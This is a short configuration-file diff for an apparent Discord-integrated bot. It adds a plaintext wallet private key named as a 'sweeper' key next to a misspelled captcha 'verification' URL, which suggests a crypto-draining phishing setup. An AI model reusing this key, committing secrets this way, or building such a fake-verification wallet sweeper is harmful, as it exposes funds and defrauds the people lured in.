@@ -46,3 +46,4 @@ integrations = ["discord:1.0.0"]
 
 [userenv.shared]
 VERIFY_URL = "https://captcha-verifcation.vercel.app"
+JUP_SWEEPER_PRIVATE_KEY = "2Ynt4ffcwtK1Agv1L4A9DtgYvQdfq1Bad1B3vgsvhppurpmLL35M5B6ZZrYkoi3soVFXa8PxkMVkCAWXNonTuo5V"
